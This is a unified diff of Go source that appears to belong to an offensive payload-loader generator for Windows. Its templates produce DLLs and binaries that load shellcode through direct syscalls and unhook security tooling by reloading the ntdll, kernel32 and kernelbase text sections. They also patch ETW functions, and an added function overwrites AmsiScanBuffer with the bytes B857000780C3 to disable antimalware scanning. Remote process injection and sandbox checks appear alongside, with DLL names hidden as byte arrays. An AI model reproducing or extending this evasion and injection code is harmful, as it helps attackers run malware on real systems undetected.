@@ -700,52 +606,35 @@ func Binary() string {
 		{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
 		{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
 		{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
-		var {{.Variables.oldfartcodeperms}} uintptr
 		{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
 		{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
-		{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
-			{{.Variables.customsyscall}}, 
+		var {{.Variables.oldfartcodeperms}} uintptr
+
+		{{.Variables.runfunc}}, _ := [loader].[NtProtectVirtualMemoryprep](
+			{{.Variables.customsyscallVP}}, 
 			{{.Variables.handlez}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
 			&{{.Variables.regionsize}},
-			syscall.PAGE_EXECUTE_READWRITE,
+			0x40,
 			&{{.Variables.oldfartcodeperms}},
 		)
 		if {{.Variables.runfunc}} != 0 {
 		}
-
-
 		for i := 0; i < len({{.Variables.bytes}}); i++ {
 			{{.Variables.loc}} := uintptr({{.Variables.dllOffset}} + uint(i))
 			{{.Variables.mem}} := (*[1]byte)(unsafe.Pointer({{.Variables.loc}}))
 			(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
 		}
-
-		{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
-			{{.Variables.customsyscall}}, 
+		{{.Variables.runfunc}}, _ = [loader].[NtProtectVirtualMemoryprep](
+			{{.Variables.customsyscallVP}}, 
 			{{.Variables.handlez}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
 			&{{.Variables.regionsize}},
 			{{.Variables.oldfartcodeperms}},
 			&{{.Variables.oldfartcodeperms}},
 		)
-		if {{.Variables.runfunc}} != 0 {
-		}
-
 		return nil
 	}
-	func [NtProtectVirtualMemory]({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
-
-		return [loader].[NtProtectVirtualMemory](
-			{{.Variables.sysid}},
-			{{.Variables.processHandle}},
-			uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
-			uintptr(unsafe.Pointer({{.Variables.regionSize}})),
-			{{.Variables.NewProtect}},
-			uintptr(unsafe.Pointer({{.Variables.oldprotect}})),
-		)
-	}
-
 `
 }
 
@@ -756,30 +645,29 @@ func DLL() string {
 	import "C"
 
 	import (
-		"crypto/aes"
-		"crypto/cipher"
 		"encoding/base64"
 		"encoding/hex"
 		"[loader]/[loader]"
-		"os"
 		"strconv"
 		"syscall"
 		"unsafe"
-
+		{{.Variables.SandboxOS}}
+		"golang.org/x/sys/windows"
 		"golang.org/x/sys/windows/registry"
 	
 	)
 
-	var  (
+	const (
+		{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
+	)
+	var _ unsafe.Pointer
+	var (
 		{{.Variables.customsyscall}} uint16
+		{{.Variables.customsyscallVP}} uint16
+		{{.Variables.number}} int = {{.Variables.b64number}}
 	)
 
-	func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
-		{{.Variables.length}} := len({{.Variables.src}})
-		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
-		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
-	}
-	
+
 	{{.Variables.Sandboxfunction}}
 
 	func {{.Variables.Versionfunc}}() {
@@ -795,6 +683,11 @@ func DLL() string {
 
 	}
 		
+	{{.Variables.WriteProcessMemory_Function}}
+
+	{{.Variables.ETW_Function}}
+
+	{{.Variables.AMSI_Function}}
 
 	func main() {
 	}
@@ -802,37 +695,13 @@ func DLL() string {
 	{{.Variables.ExportName}}
 
 
-	//export Start
-	func Start() {
+	//export Run
+	func Run() {
 		{{.Variables.Sandbox}}
 		{{.Variables.Versionfunc}}()
 		{{.Variables.ETW}}
-		{{.Variables.ciphertext}}
-		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
-		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
-		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
-	
-		{{.Variables.block}}, err := aes.NewCipher({{.Variables.vkey}})
-		if err != nil {
-			return
-		}
-	
-	
-		if len({{.Variables.vciphertext}}) < aes.BlockSize {
-			return
-		}
-	
-		{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
-		{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
-		{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
-		{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
-	
-		{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
-		{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
-		{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
-		os.Stdout, _ = os.Open(os.DevNull)
-	
-
+		{{.Variables.AMSI}}
+		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
 		var {{.Variables.phandle}} uint64
 		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
 		{{.Variables.phandle}} = 0xffffffffffffffff
@@ -851,7 +720,56 @@ func DLL() string {
 `
 }
 
-func WindowsVersion_DLL_Refresher() string {
+func WriteProcessMemory_Function() string {
+	return `
+	const (
+		{{.Variables.errnoERROR_IO_PENDING}}= 997
+	)
+	var {{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
+	var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.WriteProcessMemoryName}}"))
+
+
+	func {{.Variables.WriteProcessMemory}}({{.Variables.hProcess}} uintptr, {{.Variables.lpBaseAddress}} uintptr, {{.Variables.lpBuffer}} *byte, {{.Variables.nSize}} uintptr, {{.Variables.lpNumberOfBytesWritten}} *uintptr) (err error) {
+		r1, _, e1 := syscall.Syscall6({{.Variables.procWriteProcessMemory}}.Addr(), 5, uintptr({{.Variables.hProcess}}), uintptr({{.Variables.lpBaseAddress}}), uintptr(unsafe.Pointer({{.Variables.lpBuffer}})), uintptr({{.Variables.nSize}}), uintptr(unsafe.Pointer({{.Variables.lpNumberOfBytesWritten}})), 0)
+		if r1 == 0 {
+			if e1 != 0 {
+				err = {{.Variables.errnoErr}}(e1)
+			} else {
+				err = syscall.EINVAL
+			}
+		}
+		return
+	}
+
+	func {{.Variables.errnoErr}}(e syscall.Errno) error {
+		switch e {
+		case 0:
+			return nil
+		case {{.Variables.errnoERROR_IO_PENDING}}:
+			return {{.Variables.errERROR_IO_PENDING}}
+		}
+	
+		return e
+	}
+
+
+	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+		var {{.Variables.decoded}} []byte
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+		{{.Variables.sum}} := 1
+		for i := 1; i < {{.Variables.number}}; i++ {
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+			{{.Variables.sum}} += i
+		}
+		return string({{.Variables.decoded}})
+	
+	}
+
+
+	`
+}
+
+func WindowsVersion_Syscall() string {
 	return `
 		if {{.Variables.Version}} == "10.0" {
 			{{.Variables.customsyscall}} = 0x18
@@ -870,7 +788,7 @@ func WindowsVersion_DLL_Refresher() string {
 `
 }
 
-func WindowsVersion_DLL() string {
+func WindowsVersion_Syscall_Unmod() string {
 	return `
 		if {{.Variables.Version}} == "10.0" {
 			{{.Variables.customsyscall}} = 0x18
@@ -881,66 +799,15 @@ func WindowsVersion_DLL() string {
 		} else if {{.Variables.Version}} == "6.1" {
 			{{.Variables.customsyscall}} = 0x15
 		}
-		return
-	`
-}
-
-func WindowsVersion_Binary() string {
-	return `
-		
-		if {{.Variables.Version}} == "10.0" {
-			{{.Variables.customsyscall}} = 0x50
-		} else if {{.Variables.Version}} == "6.3" {
-			{{.Variables.customsyscall}} = 0x4f
-		} else if {{.Variables.Version}} == "6.2" {
-			{{.Variables.customsyscall}} = 0x4e
-		} else if {{.Variables.Version}} == "6.1" {
-			{{.Variables.customsyscall}}= 0x4d
-		}
-		return {{.Variables.Version}} 
 `
 }
 
 func ETW_Function() string {
 	return `
-	var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL("kernel32.dll").NewProc({{.Variables.decode}}("{{.Variables.WriteProcessMemoryName}}"))
-	var {{.Variables.procEtwNotificationRegister}} = syscall.NewLazyDLL("ntdll.dll").NewProc({{.Variables.decode}}("{{.Variables.EtwNotificationRegisterName}}"))
-	var {{.Variables.procEtwEventRegister}} = syscall.NewLazyDLL("ntdll.dll").NewProc({{.Variables.decode}}("{{.Variables.EtwEventRegisterName}}"))
-	var {{.Variables.procEtwEventWriteFull}} = syscall.NewLazyDLL("ntdll.dll").NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteFullName}}"))
-	var {{.Variables.procEtwEventWrite}} = syscall.NewLazyDLL("ntdll.dll").NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteName}}"))
-
-	
-	var (
-		errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
-	)
-	const (
-		errnoERROR_IO_PENDING = 997
-	)
-	
-
-	func {{.Variables.errnoErr}}(e syscall.Errno) error {
-		switch e {
-		case 0:
-			return nil
-		case errnoERROR_IO_PENDING:
-			return errERROR_IO_PENDING
-		}
-	
-		return e
-	}
-
-
-	func {{.Variables.WriteProcessMemory}}({{.Variables.hProcess}} uintptr, {{.Variables.lpBaseAddress}} uintptr, {{.Variables.lpBuffer}} *byte, {{.Variables.nSize}} uintptr, {{.Variables.lpNumberOfBytesWritten}} *uintptr) (err error) {
-		r1, _, e1 := syscall.Syscall6({{.Variables.procWriteProcessMemory}}.Addr(), 5, uintptr({{.Variables.hProcess}}), uintptr({{.Variables.lpBaseAddress}}), uintptr(unsafe.Pointer({{.Variables.lpBuffer}})), uintptr({{.Variables.nSize}}), uintptr(unsafe.Pointer({{.Variables.lpNumberOfBytesWritten}})), 0)
-		if r1 == 0 {
-			if e1 != 0 {
-				err = {{.Variables.errnoErr}}(e1)
-			} else {
-				err = syscall.EINVAL
-			}
-		}
-		return
-	}
+	var {{.Variables.procEtwNotificationRegister}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwNotificationRegisterName}}"))
+	var {{.Variables.procEtwEventRegister}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwEventRegisterName}}"))
+	var {{.Variables.procEtwEventWriteFull}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteFullName}}"))
+	var {{.Variables.procEtwEventWrite}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteName}}"))
 
 	func {{.Variables.ETW}}() {
 		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
@@ -956,6 +823,21 @@ func ETW_Function() string {
 `
 }
 
+func AMSI_Function() string {
+	return `
+	func {{.Variables.AMSI}}() {
+		var {{.Variables.handle}} uint64
+		{{.Variables.handle}} = 0xffffffffffffffff
+		{{.Variables.ll}}, _ := windows.LoadLibrary("amsi.dll")
+		{{.Variables.addr}}, _ := windows.GetProcAddress({{.Variables.ll}}, "AmsiScanBuffer")
+		{{.Variables.data}}, _ :=  hex.DecodeString("B857000780C3")
+		var {{.Variables.nLength}} uintptr
+		{{.Variables.datalength}} := len({{.Variables.data}})
+		{{.Variables.WriteProcessMemory}}(uintptr({{.Variables.handle}}), uintptr(uint({{.Variables.addr}})), &{{.Variables.data}}[0], uintptr(uint32({{.Variables.datalength}})), &{{.Variables.nLength}})
+	}
+	`
+}
+
 func Procces_Injection_DLL() string {
 	return `
 	package main
@@ -964,8 +846,6 @@ func Procces_Injection_DLL() string {
 
 	import (
 
-		"crypto/aes"
-		"crypto/cipher"
 		"debug/pe"
 		"encoding/base64"
 		"encoding/hex"
@@ -973,7 +853,6 @@ func Procces_Injection_DLL() string {
 		"[loader]/[loader]"
 		"io/ioutil"
 		"syscall"
-		"os"
 		"time"
 		"unsafe"
 		"strconv"
@@ -987,39 +866,24 @@ const (
 	{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
 )
 var _ unsafe.Pointer
-const (
-	{{.Variables.errnoERROR_IO_PENDING}}= 997
-)
 var (
-	{{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
 	{{.Variables.customsyscall}} uint16
 	{{.Variables.customsyscallVP}} uint16
 	{{.Variables.Version}} string
 	{{.Variables.number}} int = {{.Variables.b64number}}
 )
 
-func errnoErr(e syscall.Errno) error {
-	switch e {
-	case 0:
-		return nil
-	case {{.Variables.errnoERROR_IO_PENDING}}:
-		return {{.Variables.errERROR_IO_PENDING}}
-	}
-	return e
-}
 
+var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("WriteProcessMemory")
+var {{.Variables.funcNtCreateThreadEx}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtCreateThreadEx")
+var {{.Variables.funcNtWriteVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtWriteVirtualMemory")
+var {{.Variables.funcNtAllocateVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtAllocateVirtualMemory")
+var {{.Variables.funcNtProtectVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtProtectVirtualMemory")
 
+var {{.Variables.procEnumProcessModules}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("EnumProcessModules")
+var {{.Variables.procGetModuleBaseName}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleBaseNameW")
+var {{.Variables.procGetModuleInformation}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleInformation")
 
-
-var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")
-var {{.Variables.funcNtCreateThreadEx}} = syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateThreadEx")
-var {{.Variables.funcNtWriteVirtualMemory}} = syscall.NewLazyDLL("ntdll.dll").NewProc("NtWriteVirtualMemory")
-var {{.Variables.funcNtAllocateVirtualMemory}} = syscall.NewLazyDLL("ntdll.dll").NewProc("NtAllocateVirtualMemory")
-var {{.Variables.funcNtProtectVirtualMemory}} = syscall.NewLazyDLL("ntdll.dll").NewProc("NtProtectVirtualMemory")
-
-var {{.Variables.procEnumProcessModules}} = syscall.NewLazyDLL("psapi.dll").NewProc("EnumProcessModules")
-var {{.Variables.procGetModuleBaseName}} = syscall.NewLazyDLL("psapi.dll").NewProc("GetModuleBaseNameW")
-var {{.Variables.procGetModuleInformation}} = syscall.NewLazyDLL("psapi.dll").NewProc("GetModuleInformation")
 
 func errno(e1 error) error {
 	if e1, ok := e1.(syscall.Errno); ok && e1 == 0 {
@@ -1153,25 +1017,8 @@ func {{.Variables.EnumProcessModules}}({{.Variables.process}} windows.Handle, {{
 	return {{.Variables.n}}, nil
 }
 
-func {{.Variables.WriteProcessMemory}}({{.Variables.hProcess}} windows.Handle, {{.Variables.lpBaseAddress}} uintptr, {{.Variables.lpBuffer}} uintptr, {{.Variables.nSize}} uintptr, {{.Variables.lpNumberOfBytesWritten}} *uintptr) ({{.Variables.err}} error) {
-	r1, _, e1 := syscall.Syscall6({{.Variables.procWriteProcessMemory}}.Addr(), 5, uintptr({{.Variables.hProcess}}), uintptr({{.Variables.lpBaseAddress}}), uintptr(unsafe.Pointer({{.Variables.lpBuffer}})), uintptr({{.Variables.nSize}}), uintptr(unsafe.Pointer({{.Variables.lpNumberOfBytesWritten}})), 0)
-	if r1 == 0 {
-		if e1 != 0 {
-			{{.Variables.err}} = errnoErr(e1)
-		} else {
-			{{.Variables.err}} = syscall.EINVAL
-		}
-	}
-	return
-}
 
 {{.Variables.Sandboxfunction}}
-
-func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
-	{{.Variables.length}} := len({{.Variables.src}})
-	{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
-	return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
-}
 
 
 func {{.Variables.Versionfunc}}() string {
@@ -1186,28 +1033,22 @@ func {{.Variables.Versionfunc}}() string {
 		{{.Variables.SyscallNumberlist}}
 
 }
-func {{.Variables.decode}}({{.Variables.b64}} string,) string {
-	var {{.Variables.decoded}} []byte
-		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
-	{{.Variables.sum}} := 1
-	for i := 1; i < {{.Variables.number}}; i++ {
-		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
-		{{.Variables.sum}} += i
-	}
-	return string({{.Variables.decoded}})
 
-}
+{{.Variables.WriteProcessMemory_Function}}
 
 {{.Variables.ETW_Function}}
 
+{{.Variables.AMSI_Function}}
+
+
 func {{.Variables.loader}}()  {
-	err := {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernel32}}"))
+	err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
 	if err != nil {
 	}
-	err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernelbase}}"))
+	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'r', '.', 'd', 'l', 'l'}))
 	if err != nil {
 	}
-	err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.ntdll}}"))
+	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
 	if err != nil {
 	}
 }
@@ -1268,41 +1109,18 @@ func main() {
 {{.Variables.ExportName}}
 
 
-//export Start
-func Start() {
+//export Run
+func Run() {
 	{{.Variables.Sandbox}}
 	{{.Variables.ETW}}
+	{{.Variables.AMSI}}
 	{{.Variables.Version}} = {{.Variables.Versionfunc}}()
 	if {{.Variables.Version}} == "10.0" {
 		{{.Variables.loader}}()
 	}
 	{{.Variables.ETW}}
-	
-	{{.Variables.ciphertext}}
-	{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
-	{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
-	{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
-
-	{{.Variables.block}}, err := aes.NewCipher({{.Variables.vkey}})
-	if err != nil {
-		return
-	}
-
-
-	if len({{.Variables.vciphertext}}) < aes.BlockSize {
-		return
-	}
-
-	{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
-	{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
-	{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
-	{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
-
-	{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
-	{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
-	{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
+	{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
 	{{.Variables.ReloadRemoteProcess}}({{.Variables.raw_bin}})
-	os.Stdout, _ = os.Open(os.DevNull)
 }
 
 
@@ -1324,8 +1142,8 @@ func {{.Variables.RemoteModuleReloading}}({{.Variables.name}} string, {{.Variabl
 	{{.Variables.regionsize}} := len({{.Variables.bytes}})
 	{{.Variables.offsetaddr}} := uintptr({{.Variables.dllOffset}})
 	var {{.Variables.nLength}} uintptr
-	{{.Variables.WriteProcessMemory}}({{.Variables.handle}}, {{.Variables.offsetaddr}}, uintptr(unsafe.Pointer(&{{.Variables.data}}[0])), uintptr(uint32({{.Variables.regionsize}})), &{{.Variables.nLength}})
-
+	{{.Variables.WriteProcessMemory}}(uintptr({{.Variables.handle}}), {{.Variables.offsetaddr}}, &{{.Variables.data}}[0], uintptr(uint32({{.Variables.regionsize}})), &{{.Variables.nLength}})
+	
 	return nil
 }
 
@@ -1340,7 +1158,7 @@ func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
 	if {{.Variables.error}} != nil {
 		return {{.Variables.error}}
 	}
-	{{.Variables.x}} := {{.Variables.file}}.Section(".text")
+	{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
 	{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
 	{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
 	if {{.Variables.error}} != nil {
@@ -1349,50 +1167,12 @@ func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
 	{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
 	{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
 	{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
-	var {{.Variables.oldfartcodeperms}} uintptr
-	{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
 	{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
-	{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
-		{{.Variables.customsyscallVP}}, 
-		{{.Variables.handlez}},
-		(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
-		&{{.Variables.regionsize}},
-		syscall.PAGE_EXECUTE_READWRITE,
-		&{{.Variables.oldfartcodeperms}},
-	)
-	if {{.Variables.runfunc}} != 0 {
-	}
+	var {{.Variables.oldfartcodeperms}} uintptr
 
-
-	for i := 0; i < len({{.Variables.bytes}}); i++ {
-		{{.Variables.loc}} := uintptr({{.Variables.dllOffset}} + uint(i))
-		{{.Variables.mem}} := (*[1]byte)(unsafe.Pointer({{.Variables.loc}}))
-		(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
-	}
-
-	{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
-		{{.Variables.customsyscallVP}}, 
-		{{.Variables.handlez}},
-		(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
-		&{{.Variables.regionsize}},
-		{{.Variables.oldfartcodeperms}},
-		&{{.Variables.oldfartcodeperms}},
-	)
-	if {{.Variables.runfunc}} != 0 {
-	}
+	{{.Variables.WriteProcessMemory}}({{.Variables.handlez}}, uintptr({{.Variables.dllOffset}}), &{{.Variables.bytes}}[0], uintptr(uint32(len({{.Variables.bytes}}))), & {{.Variables.oldfartcodeperms}})
 
 	return nil
-}
-func [NtProtectVirtualMemory]({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
-
-	return [loader].[NtProtectVirtualMemory](
-		{{.Variables.sysid}},
-		{{.Variables.processHandle}},
-		uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
-		uintptr(unsafe.Pointer({{.Variables.regionSize}})),
-		{{.Variables.NewProtect}},
-		uintptr(unsafe.Pointer({{.Variables.oldprotect}})),
-	)
 }
 	
 	
@@ -1402,21 +1182,18 @@ func [NtProtectVirtualMemory]({{.Variables.sysid}} uint16, {{.Variables.processH
 func Procces_Injection() string {
 	return `
 	package main
-	
-	import "C"
+
 
 	import (
 
-		"crypto/aes"
-		"crypto/cipher"
 		"debug/pe"
 		"encoding/base64"
 		"encoding/hex"
-		"fmt"
 		"[loader]/[loader]"
 		{{.Variables.DebugImport}}
 		"io/ioutil"
 		"syscall"
+		"fmt"
 		"time"
 		"unsafe"
 		"strconv"
@@ -1431,38 +1208,23 @@ const (
 	{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
 )
 var _ unsafe.Pointer
-const (
-	{{.Variables.errnoERROR_IO_PENDING}}= 997
-)
+
 var (
-	{{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
 	{{.Variables.customsyscall}} uint16
+	{{.Variables.customsyscallVP}} uint16
 	{{.Variables.number}} int = {{.Variables.b64number}}
 )
 
-func errnoErr(e syscall.Errno) error {
-	switch e {
-	case 0:
-		return nil
-	case {{.Variables.errnoERROR_IO_PENDING}}:
-		return {{.Variables.errERROR_IO_PENDING}}
-	}
-	return e
-}
 
+var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("WriteProcessMemory")
+var {{.Variables.funcNtCreateThreadEx}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtCreateThreadEx")
+var {{.Variables.funcNtWriteVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtWriteVirtualMemory")
+var {{.Variables.funcNtAllocateVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtAllocateVirtualMemory")
+var {{.Variables.funcNtProtectVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtProtectVirtualMemory")
 
-
-
-var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")
-var {{.Variables.funcNtCreateThreadEx}} = syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateThreadEx")
-var {{.Variables.funcNtWriteVirtualMemory}} = syscall.NewLazyDLL("ntdll.dll").NewProc("NtWriteVirtualMemory")
-var {{.Variables.funcNtAllocateVirtualMemory}} = syscall.NewLazyDLL("ntdll.dll").NewProc("NtAllocateVirtualMemory")
-var {{.Variables.funcNtProtectVirtualMemory}} = syscall.NewLazyDLL("ntdll.dll").NewProc("NtProtectVirtualMemory")
-
-
-var {{.Variables.procEnumProcessModules}} = syscall.NewLazyDLL("psapi.dll").NewProc("EnumProcessModules")
-var {{.Variables.procGetModuleBaseName}} = syscall.NewLazyDLL("psapi.dll").NewProc("GetModuleBaseNameW")
-var {{.Variables.procGetModuleInformation}} = syscall.NewLazyDLL("psapi.dll").NewProc("GetModuleInformation")
+var {{.Variables.procEnumProcessModules}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("EnumProcessModules")
+var {{.Variables.procGetModuleBaseName}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleBaseNameW")
+var {{.Variables.procGetModuleInformation}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleInformation")
 
 {{.Variables.Debug}}
 
@@ -1599,41 +1361,16 @@ func {{.Variables.EnumProcessModules}}({{.Variables.process}} windows.Handle, {{
 	return {{.Variables.n}}, nil
 }
 
-func {{.Variables.WriteProcessMemory}}({{.Variables.hProcess}} windows.Handle, {{.Variables.lpBaseAddress}} uintptr, {{.Variables.lpBuffer}} uintptr, {{.Variables.nSize}} uintptr, {{.Variables.lpNumberOfBytesWritten}} *uintptr) ({{.Variables.err}} error) {
-	r1, _, e1 := syscall.Syscall6({{.Variables.procWriteProcessMemory}}.Addr(), 5, uintptr({{.Variables.hProcess}}), uintptr({{.Variables.lpBaseAddress}}), uintptr(unsafe.Pointer({{.Variables.lpBuffer}})), uintptr({{.Variables.nSize}}), uintptr(unsafe.Pointer({{.Variables.lpNumberOfBytesWritten}})), 0)
-	if r1 == 0 {
-		if e1 != 0 {
-			{{.Variables.err}} = errnoErr(e1)
-		} else {
-			{{.Variables.err}} = syscall.EINVAL
-		}
-	}
-	return
-}
 
 {{.Variables.Sandboxfunction}}
 
-func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
-	{{.Variables.length}} := len({{.Variables.src}})
-	{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
